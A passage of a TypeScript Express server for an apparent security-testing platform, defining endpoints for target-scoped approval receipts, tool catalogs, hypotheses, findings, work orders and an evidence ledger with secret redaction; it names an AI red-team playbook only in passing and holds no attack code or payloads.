      sum + Object.values(cat).reduce((s, arr) => s + arr.length, 0), 0),
  });
});

app.get('/api/preflight', async (_req: Request, res: Response) => {
  res.json(await buildPreflightReport());
});

app.get('/api/mission-context/latest', (_req: Request, res: Response) => {
  res.json(latestMissionContext());
});

app.get('/api/arsenal/catalog', (req: Request, res: Response) => {
  const family = typeof req.query.family === 'string' ? normalizeMissionFamily(req.query.family, 'web_api') : undefined;
  const category = typeof req.query.category === 'string' ? req.query.category : '';
  const execution = typeof req.query.execution === 'string' ? req.query.execution : '';
  const adapters = adaptersForFamily(family)
    .filter(adapter => !category || adapter.category === category)
    .filter(adapter => !execution || adapter.execution === execution);
  res.json({
    schema_version: 't3mp3st_arsenal_catalog/v1',
    family: family || 'all',
    summary: summarizeToolCatalog(adapters),
    adapters,
    safeCommands: SAFE_COMMANDS,
  });
});

// AI red-team technique playbook — Pliny's L1B3RT4S/P4RS3LT0NGV3 corpus distilled into a
// defanged, transferable taxonomy the ai_red_team specialist (garak/promptfoo) reasons from.
app.get('/api/ai-redteam/playbook', (_req: Request, res: Response) => {
  res.json({
    schema_version: 't3mp3st_ai_redteam_playbook/v1',
    source: 'L1B3RT4S + P4RS3LT0NGV3 (public corpus) — defanged methodology, not payloads',
    doc: 'docs/AI_REDTEAM_TECHNIQUES.md',
    count: AI_REDTEAM_PLAYBOOK.length,
    techniqueIds: AI_REDTEAM_TECHNIQUE_IDS,
    techniques: AI_REDTEAM_PLAYBOOK,
    briefing: aiRedTeamBriefing(),
  });
});

app.get('/api/arsenal/status', async (req: Request, res: Response) => {
  const family = typeof req.query.family === 'string' ? req.query.family : undefined;
  res.json(await buildArsenalStatus(family));
});

app.post('/api/arsenal/plan', (req: Request, res: Response) => {
  res.json(buildArsenalPlan(req.body as Record<string, unknown>));
});

app.get('/api/arsenal/activation', (_req: Request, res: Response) => {
  res.json(buildArsenalActivationPlan());
});

// Capability-approval gate state (TOOL-level, distinct from the action-level /api/approvals
// receipts): the tools approved this session + the full audit trail of gated decisions. Reads the
// live mission's ApprovalController when one is running, else the headless pre-authorization
// allowlist (T3MP3ST_APPROVED_TOOLS). Live decisions also stream over SSE as `arsenal.approval`.
app.get('/api/arsenal/approvals', (_req: Request, res: Response) => {
  const ctrl = tempestCommand?.approval ?? null;
  const preAuthorized = (process.env.T3MP3ST_APPROVED_TOOLS ?? '')
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean);
  // redactSecrets: the audit's action strings can carry a credential a tool was invoked with — scrub
  // it before serving (this REST path bypasses the SSE emitContractEvent redaction otherwise).
  res.json(redactSecrets({
    schema_version: 't3mp3st.arsenal_approvals/v1',
    active: Boolean(ctrl),
    gatedTiers: ['intrusive', 'credential', 'dangerous'],
    spicyTiers: ['credential', 'dangerous'],
    approvedTools: ctrl ? ctrl.approvedTools() : preAuthorized,
    preAuthorized,
    audit: ctrl ? ctrl.getAudit() : [],
    note: ctrl
      ? 'live approval state for the active mission'
      : 'no active mission — showing the pre-authorization allowlist (T3MP3ST_APPROVED_TOOLS)',
  }));
});

app.get('/api/approvals', (req: Request, res: Response) => {
  const status = typeof req.query.status === 'string' ? req.query.status : '';
  const approvals = [...approvalRequests.values()].map(approval => {
    if (approval.status === 'approved' && approval.expiresAt && Date.parse(approval.expiresAt) <= Date.now()) {
      approval.status = 'expired';
      approval.updatedAt = nowIso();
    }
    return approval;
  }).filter(approval => !status || approval.status === status);
  res.json({ approvals });
});

app.post('/api/approvals/request', (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  const action = String(body.action || 'network_request') as GuardAction;
  if (!['command_execution', 'network_request', 'mission_execution', 'autonomous_execution', 'model_call'].includes(action)) {
    res.status(400).json({ error: 'Unsupported approval action' });
    return;
  }
  const target = normalizeTargetValue(body.target);
  if (target === '*' && ['command_execution', 'network_request', 'mission_execution', 'autonomous_execution'].includes(action)) {
    res.status(400).json({
      error: 'Wildcard approval target is not allowed for active tool, mission, or autonomous actions',
      action,
      target,
      next: 'Request a target-specific receipt so evidence provenance and blast radius stay legible.',
    });
    return;
  }
  if (targetUsesWildcard(target) && target !== '*' && body.allowWildcard !== true) {
    res.status(400).json({
      error: 'Wildcard host approval requires explicit opt-in',
      action,
      target,
      next: 'Send allowWildcard:true only when the operator intentionally approves the whole subdomain wildcard.',
    });
    return;
  }
  const reason = typeof body.reason === 'string' && body.reason.trim()
    ? body.reason.trim()
    : `Approval requested for ${action} against ${target}`;
  const approval = createApprovalRequest(action, target, reason, body);
  res.status(201).json(approval);
});

app.post('/api/approvals/:id/approve', (req: Request, res: Response) => {
  const approval = approvalRequests.get(req.params.id);
  if (!approval) {
    res.status(404).json({ error: 'Approval request not found' });
    return;
  }
  const body = req.body as Record<string, unknown>;
  const ttlMinutes = Number(body.ttlMinutes || 30);
  approval.status = 'approved';
  approval.approvedBy = typeof body.approvedBy === 'string' ? body.approvedBy : 'local-operator';
  approval.expiresAt = new Date(Date.now() + Math.max(1, ttlMinutes) * 60_000).toISOString();
  approval.updatedAt = nowIso();
  emitContractEvent('approval.approved', { approvalId: approval.id, action: approval.action, target: approval.target });
  res.json(approval);
});

app.post('/api/approvals/authorize-target', (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  const target = normalizeTargetValue(body.target);
  const approvalIds = [
    typeof body.approvalId === 'string' ? body.approvalId : '',
    ...(Array.isArray(body.approvalIds) ? body.approvalIds.filter((id): id is string => typeof id === 'string') : []),
  ].filter(Boolean);
  if (!approvalIds.length) {
    res.status(400).json({
      error: 'approvalId or approvalIds required',
      next: 'Request a pending receipt first, then approve that exact receipt id.',
    });
    return;
  }
  if (target === '*') {
    res.status(400).json({
      error: 'Wildcard target authorization is not allowed for active actions',
      next: 'Authorize one concrete host or URL so receipts remain target-scoped.',
    });
    return;
  }
  if (targetUsesWildcard(target) && target !== '*' && body.allowWildcard !== true) {
    res.status(400).json({
      error: 'Wildcard host authorization requires explicit opt-in',
      next: 'Send allowWildcard:true only when the operator intentionally approves the whole subdomain wildcard.',
    });
    return;
  }

  const ttlMinutes = Math.max(1, Math.min(30, Number(body.ttlMinutes || 30)));
  const expiresAt = new Date(Date.now() + ttlMinutes * 60_000).toISOString();
  const approvals: ApprovalRequest[] = [];
  for (const id of [...new Set(approvalIds)]) {
    const approval = approvalRequests.get(id);
    if (!approval) {
      res.status(404).json({ error: 'Approval request not found', approvalId: id });
      return;
    }
    if (approval.status !== 'pending') {
      res.status(409).json({ error: 'Approval request is not pending', approvalId: id, status: approval.status });
      return;
    }
    if (target && !approvalMatches(approval, approval.action, target)) {
      res.status(400).json({
        error: 'Approval target mismatch',
        approvalId: id,
        approvalTarget: approval.target,
        target,
      });
      return;
    }
    approval.status = 'approved';
    approval.approvedBy = typeof body.approvedBy === 'string' ? body.approvedBy : 'local-operator';
    approval.expiresAt = expiresAt;
    approval.updatedAt = nowIso();
    emitContractEvent('approval.approved', { approvalId: approval.id, action: approval.action, target: approval.target });
    approvals.push(approval);
  }

  res.json({ target: target || null, expiresAt, approvals });
});

app.post('/api/approvals/:id/reject', (req: Request, res: Response) => {
  const approval = approvalRequests.get(req.params.id);
  if (!approval) {
    res.status(404).json({ error: 'Approval request not found' });
    return;
  }
  approval.status = 'rejected';
  approval.updatedAt = nowIso();
  emitContractEvent('approval.rejected', { approvalId: approval.id, action: approval.action, target: approval.target });
  res.json(approval);
});

app.get('/api/workflow-presets', (req: Request, res: Response) => {
  const family = typeof req.query.family === 'string' ? req.query.family : '';
  res.json({ presets: workflowPresetsForFamily(family) });
});

app.get('/api/resource-packs', (req: Request, res: Response) => {
  const family = typeof req.query.family === 'string' ? req.query.family : '';
  res.json({ resources: family ? resourcesForFamily(family) : RESOURCE_PACKS });
});

app.get('/api/resource-packs/:id', (req: Request, res: Response) => {
  const resource = RESOURCE_PACKS.find(pack => pack.id === req.params.id);
  if (!resource) {
    res.status(404).json({ error: 'Resource pack not found' });
    return;
  }
  res.json(resource);
});

app.get('/api/agent-prompt-packs', (req: Request, res: Response) => {
  const family = typeof req.query.family === 'string' ? req.query.family : '';
  res.json({ promptPacks: promptPacksForFamily(family) });
});

app.get('/api/agent-prompt-packs/:id', (req: Request, res: Response) => {
  const promptPack = AGENT_PROMPT_PACKS.find(pack => pack.id === req.params.id);
  if (!promptPack) {
    res.status(404).json({ error: 'Agent prompt pack not found' });
    return;
  }
  res.json(promptPack);
});

app.get('/api/operator-runbooks', (req: Request, res: Response) => {
  const family = typeof req.query.family === 'string' ? req.query.family : '';
  res.json({ runbooks: family ? OPERATOR_RUNBOOKS.filter(runbook => runbook.family === family) : OPERATOR_RUNBOOKS });
});

app.get('/api/operator-runbooks/:family', (req: Request, res: Response) => {
  const family = normalizeMissionFamily(req.params.family, 'reporting_remediation');
  const runbook = runbookForFamily(family);
  if (!runbook) {
    res.status(404).json({ error: 'Operator runbook not found', family, available: OPERATOR_RUNBOOKS.map(item => item.family) });
    return;
  }
  res.json(runbook);
});

app.get('/api/forefront-radar', (req: Request, res: Response) => {
  const family = typeof req.query.family === 'string' ? req.query.family : '';
  res.json({
    schema_version: 't3mp3st_forefront_radar/v1',
    lanes: forefrontPressureForFamily(family),
    mandate: {
      purpose: 'show what is possible early in controlled arenas, then convert offensive insight into defensive artifacts',
      pressureModel: ['horizon scanning', 'compositional pressure tests', 'model and tool races', 'local ranges', 'fast defensive conversion'],
      boundary: 'frontier pressure still requires mission authority, containment, evidence, and retestability',
    },
  });
});

app.get('/api/forefront-radar/:id', (req: Request, res: Response) => {
  const lane = FOREFRONT_PRESSURE_LANES.find(item => item.id === req.params.id);
  if (!lane) {
    res.status(404).json({ error: 'Forefront pressure lane not found', available: FOREFRONT_PRESSURE_LANES.map(item => item.id) });
    return;
  }
  res.json(lane);
});

app.post('/api/resource-packs/search', (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  const query = typeof body.query === 'string' ? body.query : '';
  const family = typeof body.family === 'string' ? body.family : '';
  res.json({ resources: searchResources(query, family) });
});

app.get('/api/agent-context/:family', (req: Request, res: Response) => {
  const family = req.params.family;
  res.json({
    family,
    workflowPresets: workflowPresetsForFamily(family),
    resources: resourcesForFamily(family),
    promptPacks: promptPacksForFamily(family),
    runbook: runbookForFamily(family),
    forefrontPressureLanes: forefrontPressureForFamily(family),
    operatorDoctrine: {
      endpoint: '/api/operator-doctrine',
      required: ['scope receipts', 'capability grants', 'evidence ledger', 'finding confidence', 'retest criteria'],
    },
    guardrails: {
      activeExecutionRequiresReceipt: true,
      evidenceRequiredForClaims: true,
      secretRedaction: true,
      preferReadOnlyUntilApproved: true,
    },
  });
});

app.get('/api/operator-doctrine', (_req: Request, res: Response) => {
  res.json({
    doctrine: PLINIAN_OPERATOR_DOCTRINE,
    operators: Object.keys(OPERATOR_SYSTEM_PROMPTS),
    reflexAgents: {
      fixer: {
        name: 'The Fixer',
        codename: 'WOLF',
        systemPrompt: THE_FIXER_SYSTEM_PROMPT,
      },
    },
    outputContract: {
      finding: ['title', 'severity', 'claim', 'confidence', 'evidence', 'resourceIds', 'remediation', 'retestCriteria'],
      completion: ['executiveOverview', 'findingsBySeverity', 'attackSurfaceMap', 'prioritizedRecommendations', 'evidenceGaps', 'missingReceipts', 'retestQueue'],
    },
    authorityModel: {
      authorizationSource: 'mission contract + approval receipts',
      notAuthorization: ['taxonomy labels', 'resource packs', 'model willingness', 'operator curiosity'],
      claimHardening: 'hypothesis -> evidence -> finding -> fix -> retest',
    },
  });
});

app.post('/api/mission-bundles', async (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  const operationDraft = body.operationDraft && typeof body.operationDraft === 'object'
    ? body.operationDraft as Record<string, unknown>
    : {};
  const missionId = typeof body.missionId === 'string'
    ? body.missionId
    : typeof operationDraft.mission_id === 'string'
      ? operationDraft.mission_id
      : '';
  const draft = missionId ? missionDrafts.get(missionId) : undefined;
  const preflight = await buildPreflightReport();
  res.json(buildMissionBundle({ draft, operationDraft, preflight }));
});

app.post('/api/mission-gate', (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  const operationDraft = body.operationDraft && typeof body.operationDraft === 'object'
    ? body.operationDraft as Record<string, unknown>
    : body;
  res.json(buildMissionGate(operationDraft));
});

app.get('/api/mission-bundles/:missionId', async (req: Request, res: Response) => {
  const draft = missionDrafts.get(req.params.missionId);
  if (!draft) {
    res.status(404).json({ error: 'Mission draft not found' });
    return;
  }
  const routePreview = buildRoutePreview(draft);
  const preflight = await buildPreflightReport();
  res.json(buildMissionBundle({ draft, operationDraft: routePreview.operationDraft, preflight }));
});

app.get('/api/hypotheses', (req: Request, res: Response) => {
  const missionId = typeof req.query.missionId === 'string' ? req.query.missionId : '';
  const operationId = typeof req.query.operationId === 'string' ? req.query.operationId : '';
  const family = typeof req.query.family === 'string' ? normalizeMissionFamily(req.query.family, 'web_api') : undefined;
  const status = typeof req.query.status === 'string' ? req.query.status : '';
  const hypotheses = scopedHypotheses(missionId, operationId, family)
    .filter(hypothesis => !status || hypothesis.status === status);
  res.json(redactSecrets({ hypotheses }));
});

app.post('/api/hypotheses', (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  if (rejectDuplicateLedgerId(res, hypothesisLedger, body.id, 'Hypothesis', '/api/hypotheses')) return;
  const evidenceForIds = normalizeStringList(body.evidenceForIds).filter(id => evidenceLedger.has(id));
  const evidenceAgainstIds = normalizeStringList(body.evidenceAgainstIds).filter(id => evidenceLedger.has(id));
  const findingIds = normalizeStringList(body.findingIds).filter(id => findingsLedger.has(id));
  const now = nowIso();
  const hypothesis: HypothesisRecord = {
    id: clientLedgerId(body.id, 'hypothesis'),
    missionId: typeof body.missionId === 'string' ? body.missionId : undefined,
    operationId: typeof body.operationId === 'string' ? body.operationId : undefined,
    family: normalizeMissionFamily(body.family, 'web_api'),
    target: normalizeTargetValue(body.target),
    claim: typeof body.claim === 'string' && body.claim.trim() ? redactLedgerText(body.claim.trim()) : 'Hypothesis requires explicit validation.',
    rationale: typeof body.rationale === 'string' && body.rationale.trim() ? redactLedgerText(body.rationale.trim()) : 'Staged from operator reasoning; requires evidence and falsification.',
    status: normalizeHypothesisStatus(body.status, evidenceForIds.length || evidenceAgainstIds.length ? 'testing' : 'open'),
    confidence: clampConfidence(body.confidence),
    evidenceForIds,
    evidenceAgainstIds,
    findingIds,
    nextTests: normalizeStringList(body.nextTests).map(item => redactLedgerText(item, 500)),
    createdAt: now,
    updatedAt: now,
  };
  hypothesisLedger.set(hypothesis.id, hypothesis);
  emitContractEvent('hypothesis.created', { hypothesisId: hypothesis.id, missionId: hypothesis.missionId, status: hypothesis.status });
  res.status(201).json(redactSecrets(hypothesis));
});

app.patch('/api/hypotheses/:id', (req: Request, res: Response) => {
  const existing = hypothesisLedger.get(req.params.id);
  if (!existing) {
    res.status(404).json({ error: 'Hypothesis not found' });
    return;
  }
  const body = req.body as Record<string, unknown>;
  const evidenceForIds = body.evidenceForIds === undefined
    ? existing.evidenceForIds
    : normalizeStringList(body.evidenceForIds).filter(id => evidenceLedger.has(id));
  const evidenceAgainstIds = body.evidenceAgainstIds === undefined
    ? existing.evidenceAgainstIds
    : normalizeStringList(body.evidenceAgainstIds).filter(id => evidenceLedger.has(id));
  let updated: HypothesisRecord = {
    ...existing,
    missionId: typeof body.missionId === 'string' ? body.missionId : existing.missionId,
    operationId: typeof body.operationId === 'string' ? body.operationId : existing.operationId,
    family: body.family === undefined ? existing.family : normalizeMissionFamily(body.family, existing.family),
    target: body.target === undefined ? existing.target : normalizeTargetValue(body.target),
    claim: typeof body.claim === 'string' && body.claim.trim() ? redactLedgerText(body.claim.trim()) : existing.claim,
    rationale: typeof body.rationale === 'string' && body.rationale.trim() ? redactLedgerText(body.rationale.trim()) : existing.rationale,
    status: body.status === undefined ? existing.status : normalizeHypothesisStatus(body.status, existing.status),
    confidence: body.confidence === undefined ? existing.confidence : clampConfidence(body.confidence),
    evidenceForIds,
    evidenceAgainstIds,
    findingIds: body.findingIds === undefined ? existing.findingIds : normalizeStringList(body.findingIds).filter(id => findingsLedger.has(id)),
    nextTests: body.nextTests === undefined ? existing.nextTests : normalizeStringList(body.nextTests).map(item => redactLedgerText(item, 500)),
    updatedAt: nowIso(),
  };
  if (body.status === undefined && updated.status === 'open' && (updated.evidenceForIds.length || updated.evidenceAgainstIds.length)) {
    updated = { ...updated, status: 'testing' };
  }
  hypothesisLedger.set(updated.id, updated);
  emitContractEvent('hypothesis.updated', { hypothesisId: updated.id, status: updated.status });
  res.json(redactSecrets(updated));
});

app.post('/api/hypotheses/:id/promote', (req: Request, res: Response) => {
  const hypothesis = hypothesisLedger.get(req.params.id);
  if (!hypothesis) {
    res.status(404).json({ error: 'Hypothesis not found' });
    return;
  }
  if (!hypothesis.evidenceForIds.length) {
    res.status(400).json({ error: 'Evidence-for required before promotion', hypothesisId: hypothesis.id });
    return;
  }
  const body = req.body as Record<string, unknown>;
  if (rejectDuplicateLedgerId(res, findingsLedger, body.id, 'Finding', '/api/findings')) return;
  const now = nowIso();
  const evidenceIds = uniqueStrings([
    ...hypothesis.evidenceForIds,
    ...normalizeStringList(body.evidenceIds).filter(id => evidenceLedger.has(id)),
  ]);
  const finding: FindingRecord = {
    id: clientLedgerId(body.id, 'finding'),
    missionId: hypothesis.missionId,
    operationId: hypothesis.operationId,
    family: hypothesis.family,
    title: typeof body.title === 'string' && body.title.trim() ? redactLedgerText(body.title.trim(), 240) : hypothesis.claim.slice(0, 96),
    target: typeof body.target === 'undefined' ? hypothesis.target : normalizeTargetValue(body.target),
    claim: hypothesis.claim,
    impact: typeof body.impact === 'string' && body.impact.trim() ? redactLedgerText(body.impact.trim()) : 'Promoted hypothesis requires owner review, remediation plan, and retest evidence.',
    severity: normalizeSeverity(body.severity),
    confidence: body.confidence === undefined ? Math.max(hypothesis.confidence, 0.65) : clampConfidence(body.confidence),
    status: normalizeFindingStatus(body.status, 'validated'),
    evidenceIds,
    resourceIds: normalizeResourceIds(body.resourceIds),
    recommendedFix: typeof body.recommendedFix === 'string' && body.recommendedFix.trim() ? redactLedgerText(body.recommendedFix.trim()) : 'Confirm root cause, implement the least-risk fix, and bind it to acceptance criteria.',
    acceptanceCriteria: normalizeStringList(body.acceptanceCriteria).length
      ? normalizeStringList(body.acceptanceCriteria).map(item => redactLedgerText(item, 500))
      : (hypothesis.nextTests.length ? hypothesis.nextTests : ['Evidence remains reproducible', 'False-positive review is complete', 'Retest passes with fresh artifact']),
    owner: typeof body.owner === 'string' ? redactLedgerText(body.owner, 240) : undefined,
    createdAt: now,
    updatedAt: now,
    retestIds: [],
  };
  findingsLedger.set(finding.id, finding);
  for (const evidenceId of finding.evidenceIds) {
    const evidence = evidenceLedger.get(evidenceId);
    if (evidence && !evidence.findingId) {
      evidence.findingId = finding.id;
      evidenceLedger.set(evidence.id, evidence);
    }
  }
  const updatedHypothesis: HypothesisRecord = {
    ...hypothesis,
    status: 'promoted',
    confidence: Math.max(hypothesis.confidence, finding.confidence),
    findingIds: uniqueStrings([...hypothesis.findingIds, finding.id]),
    updatedAt: now,
  };
  hypothesisLedger.set(updatedHypothesis.id, updatedHypothesis);
  emitContractEvent('hypothesis.promoted', { hypothesisId: updatedHypothesis.id, findingId: finding.id, confidence: finding.confidence });
  res.status(201).json(redactSecrets({ hypothesis: updatedHypothesis, finding }));
});

app.get('/api/evidence-graph', (req: Request, res: Response) => {
  res.json(buildEvidenceGraph(req.query as Record<string, unknown>));
});

app.get('/api/repro-packs', (req: Request, res: Response) => {
  res.json(buildReproPacks(req.query as Record<string, unknown>));
});

app.post('/api/repro-packs', (req: Request, res: Response) => {
  res.json(buildReproPacks(req.body as Record<string, unknown>));
});

app.get('/api/pressure-paths', (req: Request, res: Response) => {
  res.json(buildPressurePaths(req.query as Record<string, unknown>));
});

app.post('/api/pressure-paths', (req: Request, res: Response) => {
  res.json(buildPressurePaths(req.body as Record<string, unknown>));
});

app.post('/api/pressure-paths/canary', (req: Request, res: Response) => {
  res.status(201).json(buildPressureCanary(req.body as Record<string, unknown>));
});

app.post('/api/pressure-paths/duel', (req: Request, res: Response) => {
  res.status(201).json(buildPressureDuel(req.body as Record<string, unknown>));
});

app.post('/api/pressure-paths/mutate', (req: Request, res: Response) => {
  res.status(201).json(buildPressureMutations(req.body as Record<string, unknown>));
});

app.post('/api/pressure-paths/chains', (req: Request, res: Response) => {
  res.status(201).json(buildPressureChains(req.body as Record<string, unknown>));
});

app.get('/api/work-orders', (req: Request, res: Response) => {
  const missionId = typeof req.query.missionId === 'string' ? req.query.missionId : '';
  const operationId = typeof req.query.operationId === 'string' ? req.query.operationId : '';
  const hypothesisId = typeof req.query.hypothesisId === 'string' ? req.query.hypothesisId : '';
  const family = typeof req.query.family === 'string' ? normalizeMissionFamily(req.query.family, 'web_api') : undefined;
  const status = typeof req.query.status === 'string' ? req.query.status : '';
  const orders = scopedWorkOrders(missionId, operationId, family)
    .filter(order => !hypothesisId || order.hypothesisId === hypothesisId)
    .filter(order => !status || order.status === status);
  res.json({ workOrders: orders });
});

app.post('/api/work-orders', (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  const hypothesisId = typeof body.hypothesisId === 'string' ? body.hypothesisId : '';
  const hypothesis = hypothesisLedger.get(hypothesisId);
  if (!hypothesis) {
    res.status(404).json({ error: 'Hypothesis not found' });
    return;
  }
  const order = createWorkOrder(body, hypothesis);
  workOrderLedger.set(order.id, order);
  emitContractEvent('work_order.created', { workOrderId: order.id, hypothesisId: order.hypothesisId, status: order.status });
  res.status(201).json(order);
});

/**
 * POST /api/hypotheses/:id/decompose (alias: /work-orders) — split a hypothesis
 * into bounded WORK ORDERS.
 *
 * NAMING NOTE: this "decompose" is the SYNCHRONOUS hypothesis -> work-order
 * splitter (see decomposeHypothesis) — it is NOT the multi-model
 * DecompositionOrchestrator (src/orchestration, exposed at POST
 * /api/whitebox/analyze). No LLM calls happen here. The /work-orders alias below
 * points at the SAME handler and is the clearer name for what this actually does.
 */
function handleHypothesisDecompose(req: Request, res: Response): void {
  const hypothesis = hypothesisLedger.get(req.params.id);
  if (!hypothesis) {
    res.status(404).json({ error: 'Hypothesis not found' });
    return;
  }
  const orders = decomposeHypothesis(hypothesis);
  for (const order of orders) workOrderLedger.set(order.id, order);
  const existing = [...workOrderLedger.values()].filter(order => order.hypothesisId === hypothesis.id);
  emitContractEvent('hypothesis.decomposed', { hypothesisId: hypothesis.id, created: orders.length, total: existing.length });
  res.status(201).json({
    schema_version: 't3mp3st_work_order_decomposition/v1',
    hypothesis,
    created: orders,
    workOrders: existing.sort((a, b) => b.updatedAt.localeCompare(a.updatedAt)),
    nextActions: [
      orders.some(order => order.status === 'needs_receipt') ? 'Attach receipt before active or external tool probes.' : '',
      'Complete at least one prove and one disprove work order before promotion.',
      'Auto-attach completion evidence to the hypothesis graph.',
    ].filter(Boolean),
  });
}
app.post('/api/hypotheses/:id/decompose', (req: Request, res: Response) => handleHypothesisDecompose(req, res));
// Alias — clearer name for the same hypothesis -> work-order splitter above.
app.post('/api/hypotheses/:id/work-orders', (req: Request, res: Response) => handleHypothesisDecompose(req, res));

app.patch('/api/work-orders/:id', (req: Request, res: Response) => {
  const existing = workOrderLedger.get(req.params.id);
  if (!existing) {
    res.status(404).json({ error: 'Work order not found' });
    return;
  }
  const body = req.body as Record<string, unknown>;
  const updated: WorkOrderRecord = {
    ...existing,
    squad: typeof body.squad === 'string' && body.squad.trim() ? body.squad.trim() : existing.squad,
    title: typeof body.title === 'string' && body.title.trim() ? body.title.trim() : existing.title,
    objective: typeof body.objective === 'string' && body.objective.trim() ? body.objective.trim() : existing.objective,
    target: body.target === undefined ? existing.target : normalizeTargetValue(body.target),
    allowedActions: body.allowedActions === undefined ? existing.allowedActions : normalizeStringList(body.allowedActions),
    requiresReceipt: body.requiresReceipt === undefined ? existing.requiresReceipt : Boolean(body.requiresReceipt),
    toolHints: body.toolHints === undefined ? existing.toolHints : normalizeStringList(body.toolHints),
    status: body.status === undefined ? existing.status : normalizeWorkOrderStatus(body.status, existing.status),
    evidenceIds: body.evidenceIds === undefined ? existing.evidenceIds : normalizeStringList(body.evidenceIds).filter(id => evidenceLedger.has(id)),
    resultSummary: typeof body.resultSummary === 'string' ? redactLedgerText(body.resultSummary) : existing.resultSummary,
    updatedAt: nowIso(),
    completedAt: typeof body.completedAt === 'string' ? body.completedAt : existing.completedAt,
  };
  workOrderLedger.set(updated.id, updated);
  emitContractEvent('work_order.updated', { workOrderId: updated.id, status: updated.status });
  res.json(updated);
});

app.post('/api/work-orders/:id/complete', (req: Request, res: Response) => {
  const existing = workOrderLedger.get(req.params.id);
  if (!existing) {
    res.status(404).json({ error: 'Work order not found' });
    return;
  }
  const hypothesis = hypothesisLedger.get(existing.hypothesisId);
  if (!hypothesis) {
    res.status(404).json({ error: 'Hypothesis not found for work order', hypothesisId: existing.hypothesisId });
    return;
  }
  const body = req.body as Record<string, unknown>;
  if (body.createEvidence !== false && rejectDuplicateLedgerId(res, evidenceLedger, body.evidenceId, 'Evidence', '/api/evidence')) return;
  const now = nowIso();
  const resultSummary = typeof body.resultSummary === 'string' && body.resultSummary.trim()
    ? redactLedgerText(body.resultSummary.trim())
    : `Work order completed: ${existing.objective}`;
  let evidenceIds = normalizeStringList(body.evidenceIds).filter(id => evidenceLedger.has(id));
  if (body.createEvidence !== false) {
    const evidence: EvidenceEntry = {
      id: clientLedgerId(body.evidenceId, 'evidence'),
      missionId: existing.missionId,
      operationId: existing.operationId,
      type: normalizeEvidenceType(body.evidenceType || 'note'),
      title: typeof body.evidenceTitle === 'string' && body.evidenceTitle.trim() ? redactLedgerText(body.evidenceTitle.trim(), 240) : `Work order evidence: ${existing.title}`,
      summary: resultSummary,
      source: ['human', 'agent', 'tool', 'system'].includes(String(body.source)) ? body.source as EvidenceEntry['source'] : 'system',
      command: typeof body.command === 'string' ? redactLedgerText(body.command, 1200) : undefined,
      provenanceStrength: normalizeEvidenceProvenanceStrength(body.provenanceStrength, inferEvidenceProvenanceStrength({
        type: body.evidenceType || 'note',
        source: body.source || 'system',
        command: body.command,
      })),
      resourceIds: normalizeResourceIds(body.resourceIds),
      createdAt: now,
    };
    evidenceLedger.set(evidence.id, evidence);
    evidenceIds = uniqueStrings([...evidenceIds, evidence.id]);
  }
  const updatedOrder: WorkOrderRecord = {
    ...existing,
    status: 'completed',
    evidenceIds: uniqueStrings([...existing.evidenceIds, ...evidenceIds]),
    resultSummary,
    updatedAt: now,
    completedAt: now,
  };
  workOrderLedger.set(updatedOrder.id, updatedOrder);
  const disposition = String(body.disposition || (existing.kind === 'disprove' ? 'against' : 'for'));
  const updatedHypothesis: HypothesisRecord = {
    ...hypothesis,
    evidenceForIds: disposition === 'against' ? hypothesis.evidenceForIds : uniqueStrings([...hypothesis.evidenceForIds, ...evidenceIds]),
    evidenceAgainstIds: disposition === 'against' ? uniqueStrings([...hypothesis.evidenceAgainstIds, ...evidenceIds]) : hypothesis.evidenceAgainstIds,
    status: disposition === 'against'
      ? 'weakened'
      : ['promoted', 'rejected'].includes(hypothesis.status) ? hypothesis.status : 'supported',
    confidence: disposition === 'against'
      ? Math.max(0.1, hypothesis.confidence - 0.12)
      : Math.min(0.95, Math.max(hypothesis.confidence, 0.66)),
    updatedAt: now,
  };
  hypothesisLedger.set(updatedHypothesis.id, updatedHypothesis);
  emitContractEvent('work_order.completed', { workOrderId: updatedOrder.id, hypothesisId: hypothesis.id, evidenceIds, disposition });
  res.status(201).json({ workOrder: updatedOrder, hypothesis: updatedHypothesis, evidenceIds });
});

app.get('/api/watch-loop/status', (req: Request, res: Response) => {
  const scope = watchScope(req.query as Record<string, unknown>);
  const cycles = latestWatchCycles(scope.missionId, scope.operationId, scope.family).slice(0, 10);
  const signals = cycles[0]?.signals || buildWatchSignals(scope);
  res.json({
    schema_version: 't3mp3st_watch_loop_status/v1',
    scope: {
      missionId: scope.missionId || null,
      operationId: scope.operationId || null,
      family: scope.family || null,
      target: scope.target,
    },
    latestCycle: cycles[0] || null,
    cycles,
    signals,
    summary: {
      cycles: cycles.length,
      signals: signals.length,
      blocks: signals.filter(signal => signal.severity === 'block').length,
      actions: signals.filter(signal => signal.severity === 'action').length,
      watches: signals.filter(signal => signal.severity === 'watch').length,
    },
  });
});

app.post('/api/watch-loop/run', (req: Request, res: Response) => {
  const cycle = runWatchLoop(req.body as Record<string, unknown>);
  res.status(201).json({
    schema_version: 't3mp3st_watch_loop_cycle/v1',
    ...cycle,
  });
});

app.post('/api/self-heal/run', async (req: Request, res: Response) => {
  const report = await buildSelfHealReport(req.body as Record<string, unknown>);
  res.status(201).json(report);
});

app.get('/api/evidence', (req: Request, res: Response) => {
  const missionId = typeof req.query.missionId === 'string' ? req.query.missionId : '';
  const operationId = typeof req.query.operationId === 'string' ? req.query.operationId : '';
  const findingId = typeof req.query.findingId === 'string' ? req.query.findingId : '';
  const entries = [...evidenceLedger.values()]
    .filter(entry => !missionId || entry.missionId === missionId)
    .filter(entry => !operationId || entry.operationId === operationId)
    .filter(entry => !findingId || entry.findingId === findingId)
    .sort((a, b) => b.createdAt.localeCompare(a.createdAt));
  res.json(redactSecrets({ evidence: entries }));
});

app.post('/api/evidence', (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  if (rejectDuplicateLedgerId(res, evidenceLedger, body.id, 'Evidence', '/api/evidence')) return;
  const evidence: EvidenceEntry = {
    id: clientLedgerId(body.id, 'evidence'),
    missionId: typeof body.missionId === 'string' ? body.missionId : undefined,
    operationId: typeof body.operationId === 'string' ? body.operationId : undefined,
    findingId: typeof body.findingId === 'string' ? body.findingId : undefined,
    type: normalizeEvidenceType(body.type),
